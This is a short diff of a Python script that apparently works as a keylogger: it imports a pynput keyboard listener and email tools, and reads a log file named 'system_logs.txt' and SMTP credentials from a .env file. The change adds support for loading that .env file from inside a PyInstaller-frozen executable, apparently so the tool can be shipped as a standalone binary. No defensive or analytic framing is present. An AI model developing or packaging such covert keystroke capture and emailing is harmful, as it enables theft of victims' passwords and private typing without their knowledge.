@@ -7,8 +7,13 @@ from email.message import EmailMessage
 from datetime import datetime
 from pynput import keyboard
 from dotenv import load_dotenv
+import sys
 
-load_dotenv()
+if getattr(sys, 'frozen', False):
+    env_path = os.path.join(sys._MEIPASS, '.env')
+else:
+    env_path = os.path.join(os.path.dirname(__file__), '.env')
+load_dotenv(dotenv_path=env_path)
 
 LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")
 SMTP_EMAIL = os.getenv("SMTP_EMAIL", "")
